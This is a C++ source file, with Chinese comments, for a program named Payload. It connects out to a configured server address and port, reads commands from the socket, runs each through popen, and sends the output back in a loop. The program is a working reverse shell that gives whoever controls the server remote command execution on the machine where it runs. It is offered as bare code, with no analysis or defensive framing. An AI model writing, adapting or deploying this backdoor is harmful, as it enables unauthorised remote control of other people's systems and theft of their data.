#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstdio>
#include <stdexcept>

#define SERVER_IP "127.0.0.1"  // 远程服务器 IP 地址
#define SERVER_PORT 12345      // 远程服务器端口号
#define LOG_FILE "payload.log" // 日志文件

class Payload {
public:
    Payload(const std::string& server_ip, int server_port);
    ~Payload();
    void run();

private:
    void log(const std::string& message);
    void logError(const std::string& message);
    void handleError(const std::string& message);

    int sockfd;
    struct sockaddr_in serv_addr;
    std::ofstream logStream;
};

Payload::Payload(const std::string& server_ip, int server_port) {
    logStream.open(LOG_FILE, std::ios::app);
    if (!logStream) {
        throw std::runtime_error("Failed to open log file");
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        handleError("ERROR opening socket");
    }

    std::memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_ip.c_str(), &serv_addr.sin_addr) <= 0) {
        handleError("ERROR invalid server IP address");
    }

    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        handleError("ERROR connecting");
    }
}

Payload::~Payload() {
    if (logStream.is_open()) {
        logStream.close();
    }
    if (sockfd >= 0) {
        close(sockfd);
    }
}

void Payload::log(const std::string& message) {
    logStream << message << std::endl;
}

void Payload::logError(const std::string& message) {
    logStream << "ERROR: " << message << std::endl;
}

void Payload::handleError(const std::string& message) {
    logError(message);
    throw std::runtime_error(message);
}

void Payload::run() {
    char buffer[1024];
    ssize_t n;

    while (true) {
        std::memset(buffer, 0, sizeof(buffer));
        n = read(sockfd, buffer, sizeof(buffer) - 1);
        if (n <= 0) {
            break;  // 连接关闭或出错
        }
        std::string command(buffer);
        log("Received command: " + command);

        std::string result;
        FILE* fp = popen(command.c_str(), "r");
        if (fp == nullptr) {
            result = "Failed to run command: " + command;
            logError(result);
        } else {
            char line[256];
            while (fgets(line, sizeof(line) - 1, fp) != nullptr) {
                result += line;
            }
            pclose(fp);
        }

        ssize_t bytes_written = write(sockfd, result.c_str(), result.length());
        if (bytes_written < 0) {
            logError("Failed to send data to server");
            break;
        }
        log("Command output sent to server.");
    }
}

int main() {
    try {
        Payload payload(SERVER_IP, SERVER_PORT);
        payload.run();
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
